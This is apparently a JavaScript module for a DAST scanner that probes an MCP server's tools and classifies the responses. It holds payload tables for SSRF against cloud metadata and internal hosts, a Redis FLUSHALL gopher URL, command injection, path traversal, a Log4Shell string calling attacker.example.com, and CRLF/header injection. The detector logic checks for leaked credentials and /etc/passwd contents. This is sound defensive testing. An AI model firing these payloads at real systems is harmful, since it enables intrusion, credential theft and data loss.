/**
 * DAST probe definitions and detector logic — pure module, no I/O.
 *
 * This file is .mjs (not .ts) so it can be imported directly by the Node.js
 * scanner (scripts/scan-dast.mjs) without a build step, while also being
 * importable by Vitest tests (src/security/dastDetectors.test.ts). Keeping it
 * as plain ESM avoids the dist/-staleness problem: if this were compiled
 * TypeScript, a stale dist/ would mean the tested detector and the shipped
 * detector silently differ. Direct import of the .mjs prevents that.
 *
 * Exports:
 *   SSRF_TARGETS, INJECTION_PAYLOADS, PATH_TRAVERSAL_PAYLOADS, CRLF_PAYLOADS
 *   BLOCK_SIGNATURES, SSRF_EXPLOITATION_TOKENS
 *   classifyParam, safeDefaultArg, buildProbesForTool
 *   redactEcho, evaluateProbe
 */

// ── Probe payload tables ──────────────────────────────────────────────────────

export const SSRF_TARGETS = [
  { label: 'AWS_METADATA',    url: 'http://169.254.169.254/latest/meta-data/' },
  { label: 'GCP_METADATA',    url: 'http://metadata.google.internal/computeMetadata/v1/' },
  { label: 'LOCALHOST_ADMIN', url: 'http://localhost/admin' },
  { label: 'RFC1918_10X',     url: 'http://10.0.0.1/' },
  { label: 'RFC1918_192168',  url: 'http://192.168.1.1/' },
  { label: 'LINK_LOCAL',      url: 'http://169.254.0.1/' },
  { label: 'FILE_PROTO',      url: 'file:///etc/passwd' },
  { label: 'GOPHER_PROTO',    url: 'gopher://127.0.0.1:6379/_FLUSHALL%0D%0A' },
];

export const INJECTION_PAYLOADS = [
  { label: 'XSS',        value: '<script>alert(document.domain)</script>' },
  // Product 981999769 is improbable in ordinary output (UUIDs, timestamps, counters).
  // The expression itself does not contain its own product, so it is non-self-matching.
  // (The old {{7*7}} → 49 was unsafe: '49' appears in roughly 1/3 of UUIDs.)
  { label: 'SSTI',       value: '{{31337*31337}}__${31337*31337}__<%=31337*31337%>' },
  { label: 'CMD_INJECT', value: '; cat /etc/passwd #' },
  { label: 'PATH_TRAV',  value: '../../../../../../etc/passwd' },
  { label: 'NULL_BYTE',  value: 'test\x00injection' },
  { label: 'LOG4SHELL',  value: '${jndi:ldap://attacker.example.com/a}' },
];

export const PATH_TRAVERSAL_PAYLOADS = [
  { label: 'ABSOLUTE_SENSITIVE',  value: '/etc/passwd' },
  { label: 'ABSOLUTE_APP_CODE',   value: '/app/dist/index.js' },
  { label: 'RELATIVE_TRAVERSAL',  value: '../../../../etc/passwd' },
  { label: 'ENCODED_TRAVERSAL',   value: '/tmp/..%2f..%2fetc%2fpasswd' },
  { label: 'NULL_BYTE_TRAVERSAL', value: '/tmp/test\x00.pdf' },
  { label: 'PREFIX_ESCAPE',       value: '/tmp/../../../etc/passwd' },
];

// Note: CRLF_INJECT is detected via response *headers* (x-injected-2), not body.
// AUTH_FORWARD and HOST_OVERRIDE are inconclusive without a canary endpoint.
export const CRLF_PAYLOADS = [
  { label: 'CRLF_INJECT',   key: 'X-Injected',   value: 'test\r\nX-Injected-2: evil' },
  { label: 'AUTH_FORWARD',  key: 'Authorization', value: 'Bearer attacker-forwarded-token' },
  { label: 'HOST_OVERRIDE', key: 'Host',          value: 'attacker.example.com' },
];

// ── Classification ─────────────────────────────────────────────────────────────

/**
 * Map a JSON Schema property descriptor onto a payload class.
 * Returns null for parameters with no known attack surface.
 * Mirrors the classification logic in src/tools/definitions.test.ts.
 */
export function classifyParam(paramName, jsonSchema) {
  const n = paramName.toLowerCase();
  if (n === 'url' || n === 'urls') return 'ssrf';
  if (n === 'outputpath' || n.endsWith('path') || n === 'filename') return 'path';
  if (n === 'headers' && jsonSchema?.type === 'object') return 'headers';
  if (n === 'query' || n === 'jobid') return 'injection';
  return null;
}

/**
 * Return a safe, benign default value for a required parameter that is NOT the
 * one currently being probed. Values are chosen to reach tool handlers without
 * meaningful side-effects.
 */
export function safeDefaultArg(paramName, jsonSchema) {
  const n = paramName.toLowerCase();
  if (n === 'url')  return 'http://example.com/robots.txt';
  if (n === 'urls') return ['http://example.com/robots.txt'];
  if (n === 'outputpath' || n.endsWith('path')) return '/tmp/probe-safe-default';
  if (n === 'jobid') return 'probe-nonexistent-job-safe';
  if (jsonSchema?.type === 'string')  return 'probe-safe-string';
  if (jsonSchema?.type === 'number' || jsonSchema?.type === 'integer') return 1;
  if (jsonSchema?.type === 'boolean') return false;
  if (jsonSchema?.type === 'array')   return [];
  return undefined;
}

/**
 * Generate all probe specs for a single tool from its JSON Schema (as returned by
 * tools/list). Each spec carries enough context to build the MCP call and evaluate
 * the response.
 */
export function buildProbesForTool(tool) {
  const props    = tool.inputSchema?.properties ?? {};
  const required = new Set(tool.inputSchema?.required ?? []);
  const probes   = [];

  for (const [paramName, paramSchema] of Object.entries(props)) {
    const cls = classifyParam(paramName, paramSchema);
    if (!cls) continue;

    const baseArgs = {};
    for (const req of required) {
      if (req === paramName) continue;
      const val = safeDefaultArg(req, props[req]);
      if (val !== undefined) baseArgs[req] = val;
    }

    let payloads;
    if (cls === 'ssrf') {
      payloads = SSRF_TARGETS.map(t => ({
        label: t.label,
        value: paramSchema.type === 'array' ? [t.url] : t.url,
      }));
    } else if (cls === 'path') {
      payloads = PATH_TRAVERSAL_PAYLOADS;
    } else if (cls === 'headers') {
      payloads = CRLF_PAYLOADS.map(p => ({
        label: p.label,
        value: { [p.key]: p.value },
      }));
    } else {
      payloads = INJECTION_PAYLOADS;
    }

    for (const p of payloads) {
      probes.push({
        toolName:     tool.name,
        paramName,
        payloadClass: cls,
        label:        `${tool.name}.${paramName}/${p.label}`,
        args:         { ...baseArgs, [paramName]: p.value },
      });
    }
  }

  return probes;
}

// ── Signatures ────────────────────────────────────────────────────────────────
//
// BLOCK_SIGNATURES: constant fragments from guard error messages that prove the
// guard fired. These are verified to be non-self-matching by the meta-guard in
// src/security/dastDetectors.test.ts. Changing a guard error message MUST be
// reflected here, or the block will be misclassified as inconclusive.

export const BLOCK_SIGNATURES = [
  // domainBlacklist.ts validateUrl — private/local address check
  'SSRF protection: private or local addresses not allowed',
  // domainBlacklist.ts validateUrl — protocol check
  'protocol not supported',
  // errors.ts SsrfViolationError message prefix
  'SSRF violation:',
  // errors.ts SsrfViolationError message suffix
  'resolved to private address',
  // domainBlacklist.ts validateUrl — domain blocked
  'Domain blocked:',
  // domainBlacklist.ts validateUrl — URL parse failure
  'Invalid URL format',
  // domainBlacklist.ts validateUrl — protocol rejection
  'Invalid URL:',
  // definitions.ts download_file outputPath guard
  'outputPath must be within an allowed directory',
  'outputPath must be an absolute path',
];

// DNS/network failure patterns — environment prevented the test from proving anything.
// A DNS failure off-cloud is NOT evidence the guard fired; it is evidence the
// environment could not even attempt the request.
export const DNS_FAILURE_PATTERNS = [
  'ENOTFOUND',
  'EAI_AGAIN',
  'ECONNREFUSED',
  'ETIMEDOUT',
  'ENETUNREACH',
  'EHOSTUNREACH',
  'getaddrinfo',
  'network timeout',
  'ECONNRESET',
];

// SSRF exploitation tokens — present only in genuinely retrieved internal content.
// None of these may appear in any probe URL or payload (enforced by meta-guard in
// src/security/dastDetectors.test.ts). Removed vs. old set:
//   - 'computeMetadata' was a substring of the GCP probe URL → false positives
//   - 'instance-type'   appears in documentation pages, too ambiguous
//   - 'project-id'      appears in Google developer docs, too ambiguous
export const SSRF_EXPLOITATION_TOKENS = [
  // AWS IMDSv1 root listing
  { token: 'ami-launch-index', pair: null },
  { token: 'iam/security-credentials', pair: null },
  { token: 'block-device-mapping', pair: null },
  // Unix /etc/passwd — require TWO recognisable fields to avoid false positives
  // from scraped documentation that quotes a single /etc/passwd line
  { token: 'root:x:0:0:', pair: 'daemon:x:1:1:' },
  // Redis INFO output
  { token: 'redis_version:', pair: null },
  { token: '-ERR unknown command', pair: null },
  { token: '+PONG', pair: null },
  // GCP service account token — only reachable with Metadata-Flavor: Google header
  { token: '"access_token"', pair: '"expires_in"' },
];

// ── Echo redaction ─────────────────────────────────────────────────────────────

/**
 * Walk an object and collect all string leaf values.
 */
function collectStrings(obj) {
  if (typeof obj === 'string') return [obj];
  if (Array.isArray(obj)) return obj.flatMap(collectStrings);
  if (obj !== null && typeof obj === 'object') return Object.values(obj).flatMap(collectStrings);
  return [];
}

/**
 * Remove echoed probe inputs from the response body before signature matching.
 *
 * A probe URL appearing in the response body means the server echoed it (e.g., in
 * an error message), NOT that it retrieved content from that URL. Matching tokens
 * against a body that still contains the echoed input causes false positives.
 *
 * For URL-type values, strips the full URL plus its hostname, origin, and pathname
 * individually, since different tools echo different URL components.
 *
 * Replacements are done longest-first to prevent a partial replacement leaving a
 * shorter fragment that then matches another pattern.
 */
export function redactEcho(body, args) {
  const strings = collectStrings(args);
  const patterns = new Set();

  for (const s of strings) {
    if (!s || s.length < 4) continue;
    patterns.add(s);
    // JSON-escaped form (what appears in JSON string literals)
    const jsonEscaped = JSON.stringify(s).slice(1, -1);
    if (jsonEscaped !== s) patterns.add(jsonEscaped);
    // URL-encoded form
    try { patterns.add(encodeURIComponent(s)); } catch {}
    // For URL-typed values, also strip components separately
    try {
      const u = new URL(s);
      if (u.href) patterns.add(u.href);
      if (u.origin && u.origin !== 'null') patterns.add(u.origin);
      if (u.hostname) patterns.add(u.hostname);
      if (u.host) patterns.add(u.host);
      if (u.pathname && u.pathname !== '/') patterns.add(u.pathname);
    } catch {}
  }

  // Sort longest-first so a full URL is consumed before its hostname substring
  const sorted = [...patterns].filter(p => p.length > 3).sort((a, b) => b.length - a.length);

  let result = body;
  for (const pat of sorted) {
    result = result.split(pat).join('[REDACTED]');
  }
  return result;
}

// ── Core evaluator ─────────────────────────────────────────────────────────────

/**
 * Evaluate a JSON-RPC response for signs of probe success or failure.
 *
 * @param spec  Probe spec: { toolName, paramName, payloadClass, label, args }
 * @param resp  Response: { status: number, headers: Record<string,string>, body: string }
 * @returns Verdict: { outcome, severity?, id, description, detail?, inconclusiveReason? }
 *
 * Outcomes:
 *   'exploited'      — positive evidence the payload succeeded; severity is present
 *   'blocked'        — positive evidence a named guard fired (named in detail)
 *   'inconclusive'   — environment or async path prevents a verdict; inconclusiveReason present
 *   'info'           — not a security finding but worth noting (e.g., input echo in JSON)
 *   'not-applicable' — probe cannot apply to this surface (e.g., LOG4SHELL on Node.js)
 *
 * Design principles:
 *   - 'blocked' requires a positive guard signature — NOT just the absence of exploitation.
 *   - 'inconclusive' must appear as a distinct report bucket, never collapsed into 'pass'.
 *   - Echo stripping is applied before all token matching, eliminating self-matching false positives.
 */
export function evaluateProbe(spec, { status, headers, body }) {
  const tag = spec.label.replace(/[^A-Z0-9]/gi, '_').toUpperCase();
  const redacted = redactEcho(body, spec.args);
  const ct = (headers['content-type'] ?? headers['Content-Type'] ?? '').toLowerCase();

  switch (spec.payloadClass) {
    case 'ssrf':    return _evalSsrf(spec, tag, redacted, body);
    case 'path':    return _evalPath(spec, tag, redacted, body);
    case 'headers': return _evalHeaders(spec, tag, headers, body);
    default:        return _evalInjection(spec, tag, ct, redacted, body);
  }
}

// ── Private evaluators ─────────────────────────────────────────────────────────

function _evalSsrf(spec, tag, redacted, rawBody) {
  // 1. Positive block — a guard error signature is present after echo-stripping.
  //    Matching after stripping ensures we see the guard's OWN message, not an
  //    echoed probe URL that happens to contain the signature string.
  for (const sig of BLOCK_SIGNATURES) {
    if (redacted.includes(sig)) {
      return {
        outcome: 'blocked',
        id: `SSRF_${tag}`,
        description: `SSRF blocked by guard ("${sig.slice(0, 50)}"): ${spec.label}`,
        detail: sig,
      };
    }
  }

  // 2. DNS/network failure — environment prevented the test from proving anything.
  //    This is NOT a pass: a DNS failure off-cloud cannot be distinguished from
  //    a genuine guard firing or a temporarily down host.
  for (const pat of DNS_FAILURE_PATTERNS) {
    if (redacted.includes(pat)) {
      return {
        outcome: 'inconclusive',
        id: `SSRF_${tag}`,
        description: `SSRF inconclusive — DNS/network failure (${pat}): ${spec.label}`,
        detail: 'DNS or network failure prevented the test from running. ' +
                'Cannot distinguish "guard fired" from "host unreachable". ' +
                'Off-cloud, metadata hostnames never resolve; this is not a pass.',
        inconclusiveReason: 'dns_unresolvable',
      };
    }
  }

  // 3. Async tool (crawl_start): no synchronous fetch occurs, so the URL was
  //    accepted for a background job without an upfront guard check. Accepting a
  //    private/metadata URL for future fetching is itself a defect. Reported as
  //    SSRF_URL_ACCEPTED (HIGH), not SSRF_* (CRITICAL), because the defect is the
  //    missing synchronous guard — the actual fetch may still be blocked by the
  //    worker's undici guard.
  if (spec.toolName === 'crawl_start') {
    if (redacted.includes('"status":"running"') || redacted.includes('"status":"queued"')) {
      return {
        outcome: 'exploited',
        severity: 'HIGH',
        id: `SSRF_URL_ACCEPTED_${tag}`,
        description: `SSRF: URL accepted for async job without synchronous guard rejection: ${spec.label}`,
        detail: 'crawl_start queued a potentially private/metadata URL without upfront validation. ' +
                'The guard should call validateUrl() before creating the job. ' +
                'Exploitation depends on whether the worker\'s per-fetch guard fires.',
      };
    }
    // crawl_start with error response — no job created, URL was rejected
    return {
      outcome: 'inconclusive',
      id: `SSRF_${tag}`,
      description: `SSRF inconclusive — crawl_start returned error, no block signature found: ${spec.label}`,
      detail: 'The job was not created but no recognised guard signature was present.',
      inconclusiveReason: 'unknown',
    };
  }

  // 4. Exploitation tokens — present only in genuinely retrieved internal content.
  //    Checked AFTER echo-stripping so echoed probe input can never trip these.
  for (const { token, pair } of SSRF_EXPLOITATION_TOKENS) {
    if (redacted.includes(token)) {
      if (!pair || redacted.includes(pair)) {
        return {
          outcome: 'exploited',
          severity: 'CRITICAL',
          id: `SSRF_${tag}`,
          description: `SSRF succeeded — internal resource content retrieved via ${spec.label}`,
          detail: rawBody.slice(0, 300),
        };
      }
    }
  }

  // 5. No signal in either direction.
  //    The old detector called this 'pass' ("SSRF blocked"). It is NOT a pass:
  //    a response with none of the expected exploitation tokens could mean the
  //    guard fired but the error message matches no signature, OR the attack
  //    succeeded but returned unfamiliar content. Without positive block evidence,
  //    this is inconclusive.
  return {
    outcome: 'inconclusive',
    id: `SSRF_${tag}`,
    description: `SSRF inconclusive — no guard signature and no exploitation token: ${spec.label}`,
    detail: 'Cannot determine whether the guard fired. ' +
            'No recognised block signature was present and no exploitation token was detected. ' +
            'This may be a false negative if the server returned unfamiliar internal content.',
    inconclusiveReason: 'unknown',
  };
}

function _evalPath(spec, tag, redacted, rawBody) {
  // Detect arbitrary write: parse JSON and read structuredContent.savedPath.
  // Substring-matching on '"savedPath"' is echo-vulnerable (the probe inputs
  // the path and the response echoes it), so we parse the envelope instead.
  try {
    const parsed = JSON.parse(rawBody);
    const savedPath = parsed?.result?.structuredContent?.savedPath;
    if (typeof savedPath === 'string' && !savedPath.startsWith('/tmp')) {
      const sensitive = ['/etc/', '/app/', '/usr/', '/bin/', '/sbin/', '/proc/', '/root/', '/home/'];
      if (sensitive.some(p => savedPath.startsWith(p))) {
        return {
          outcome: 'exploited',
          severity: 'HIGH',
          id: `ARBITRARY_WRITE_${tag}`,
          description: `Arbitrary file write — path accepted outside allowed directories: ${spec.label}`,
          detail: `savedPath: ${savedPath}`,
        };
      }
    }
  } catch {}

  // Guard signatures
  for (const sig of BLOCK_SIGNATURES) {
    if (redacted.includes(sig)) {
      return {
        outcome: 'blocked',
        id: `PATH_TRAVERSAL_${tag}`,
        description: `Path traversal blocked by guard: ${spec.label}`,
        detail: sig,
      };
    }
  }

  // LFI: /etc/passwd content (two-token to avoid false positives from documentation)
  if (redacted.includes('root:x:0:0:') && redacted.includes('daemon:x:1:1:')) {
    return {
      outcome: 'exploited',
      severity: 'CRITICAL',
      id: `PATH_TRAVERSAL_LFI_${tag}`,
      description: `Path traversal LFI — /etc/passwd content in response: ${spec.label}`,
      detail: rawBody.slice(0, 300),
    };
  }

  // App code disclosure
  if (redacted.includes('__esModule') && redacted.includes('Object.defineProperty(exports')) {
    return {
      outcome: 'exploited',
      severity: 'HIGH',
      id: `PATH_TRAVERSAL_APP_CODE_${tag}`,
      description: `Path traversal may have returned compiled application code: ${spec.label}`,
      detail: rawBody.slice(0, 300),
    };
  }

  return {
    outcome: 'inconclusive',
    id: `PATH_TRAVERSAL_${tag}`,
    description: `Path traversal inconclusive: ${spec.label}`,
    detail: 'No exploitation signal and no guard signature found.',
    inconclusiveReason: 'unknown',
  };
}

function _evalHeaders(spec, tag, responseHeaders, rawBody) {
  const respHeaderKeys = Object.keys(responseHeaders).map(k => k.toLowerCase());

  // CRLF injection: injected header appears in response headers (not the body).
  // Checking response headers is echo-immune — the payload is in the request body,
  // so it can only reach a response header if injection actually worked.
  if (spec.label.includes('CRLF_INJECT') && respHeaderKeys.includes('x-injected-2')) {
    return {
      outcome: 'exploited',
      severity: 'HIGH',
      id: `CRLF_INJECT_${tag}`,
      description: `CRLF injection succeeded — injected header present in response: ${spec.label}`,
      detail: 'x-injected-2 found in response headers',
    };
  }

  // AUTH_FORWARD and HOST_OVERRIDE: in-band result cannot determine if forwarded.
  // Would need a canary endpoint that echoes what it received.
  if (spec.label.includes('AUTH_FORWARD') || spec.label.includes('HOST_OVERRIDE')) {
    return {
      outcome: 'inconclusive',
      id: `HEADER_${tag}`,
      description: `Header injection inconclusive — requires canary endpoint to verify: ${spec.label}`,
      detail: 'Cannot determine if header was forwarded without an endpoint that echoes received headers.',
      inconclusiveReason: 'no_canary',
    };
  }

  // CRLF not found in response headers
  return {
    outcome: 'blocked',
    id: `CRLF_${tag}`,
    description: `Header injection safe — injected header not in response: ${spec.label}`,
    detail: '',
  };
}

function _evalInjection(spec, tag, contentType, redacted, rawBody) {
  // LOG4SHELL: no JVM in the stack, no outbound callback listener — cannot verify in-band.
  if (spec.label.includes('/LOG4SHELL')) {
    return {
      outcome: 'not-applicable',
      id: `LOG4SHELL_${tag}`,
      description: `LOG4SHELL not applicable — no JVM in stack, cannot verify in-band: ${spec.label}`,
      detail: 'No outbound LDAP/RMI callback listener configured.',
    };
  }

  // NULL_BYTE: requires a filesystem or database sink to observe effect.
  if (spec.label.includes('/NULL_BYTE')) {
    return {
      outcome: 'inconclusive',
      id: `NULL_BYTE_${tag}`,
      description: `NULL byte injection inconclusive — requires filesystem/DB sink: ${spec.label}`,
      detail: 'Cannot determine effect without observing filesystem or database behaviour.',
      inconclusiveReason: 'no_observable_sink',
    };
  }

  // XSS: only meaningful with an HTML sink.
  // /mcp is always application/json — there is no HTML sink, so payload echo is harmless.
  // This matches the Content-Type of the actual transport; the only case where XSS is
  // real is if a server somehow returned text/html for the /mcp endpoint.
  if (spec.label.includes('/XSS')) {
    const isHtmlResponse = contentType.includes('text/html');
    if (isHtmlResponse) {
      // For HTML responses, echoing the payload RAW is the vulnerability — the browser
      // would execute it. Check rawBody here, not redacted: the echo IS the exploit evidence.
      if (rawBody.includes('<script>') && rawBody.includes('alert(')) {
        return {
          outcome: 'exploited',
          severity: 'HIGH',
          id: `XSS_REFLECTED_${tag}`,
          description: `XSS payload reflected unescaped in HTML response: ${spec.label}`,
          detail: rawBody.slice(0, 300),
        };
      }
      return {
        outcome: 'blocked',
        id: `XSS_${tag}`,
        description: `XSS safe — payload not reflected in HTML response: ${spec.label}`,
        detail: '',
      };
    }
    // Non-HTML (application/json): echoing is normal and correct for error messages.
    // JSON does not execute <script> in a browser without an unsafe eval sink.
    if (rawBody.includes('<script>') || rawBody.includes('alert(')) {
      return {
        outcome: 'info',
        id: `INPUT_ECHOED_${tag}`,
        description: `Input reflected in application/json response — not a vulnerability (no HTML sink): ${spec.label}`,
        detail: 'JSON does not execute <script> in a browser. Echoing invalid input in an error message is intended behaviour.',
      };
    }
    return {
      outcome: 'blocked',
      id: `XSS_${tag}`,
      description: `XSS safe — payload not reflected in response: ${spec.label}`,
      detail: '',
    };
  }

  // SSTI: evaluate the new {{31337*31337}} payload — product is 981999769.
  // Requires the product to appear WITHOUT the original expression (to distinguish
  // a template engine evaluating the expression from an echo of the expression itself).
  if (spec.label.includes('/SSTI')) {
    const product = '981999769';
    const expr = '31337*31337';
    if (redacted.includes(product) && !redacted.includes(expr)) {
      return {
        outcome: 'exploited',
        severity: 'HIGH',
        id: `SSTI_${tag}`,
        description: `SSTI — template expression evaluated to product ${product}: ${spec.label}`,
        detail: rawBody.slice(0, 300),
      };
    }
    return {
      outcome: 'blocked',
      id: `SSTI_${tag}`,
      description: `SSTI safe — expression not evaluated: ${spec.label}`,
      detail: '',
    };
  }

  // CMD_INJECT: /etc/passwd via command injection (two-token requirement)
  if (spec.label.includes('/CMD_INJECT')) {
    if (redacted.includes('root:x:0:0:') && redacted.includes('daemon:x:1:1:')) {
      return {
        outcome: 'exploited',
        severity: 'CRITICAL',
        id: `CMD_INJECT_${tag}`,
        description: `Command injection — /etc/passwd returned: ${spec.label}`,
        detail: rawBody.slice(0, 300),
      };
    }
    if (redacted.includes('uid=') && redacted.includes('gid=')) {
      return {
        outcome: 'exploited',
        severity: 'CRITICAL',
        id: `CMD_INJECT_${tag}`,
        description: `Command injection — id output returned: ${spec.label}`,
        detail: rawBody.slice(0, 300),
      };
    }
    return {
      outcome: 'blocked',
      id: `CMD_INJECT_${tag}`,
      description: `Command injection safe: ${spec.label}`,
      detail: '',
    };
  }

  // PATH_TRAV in injection context (e.g., jobId containing traversal path)
  if (spec.label.includes('/PATH_TRAV')) {
    if (redacted.includes('root:x:0:0:') && redacted.includes('daemon:x:1:1:')) {
      return {
        outcome: 'exploited',
        severity: 'CRITICAL',
        id: `PATH_TRAV_${tag}`,
        description: `Path traversal via injection parameter: ${spec.label}`,
        detail: rawBody.slice(0, 300),
      };
    }
    return {
      outcome: 'blocked',
      id: `PATH_TRAV_${tag}`,
      description: `Path traversal injection safe: ${spec.label}`,
      detail: '',
    };
  }

  // Generic fallback
  return {
    outcome: 'blocked',
    id: `INJECTION_${tag}`,
    description: `Injection safe: ${spec.label}`,
    detail: '',
  };
}
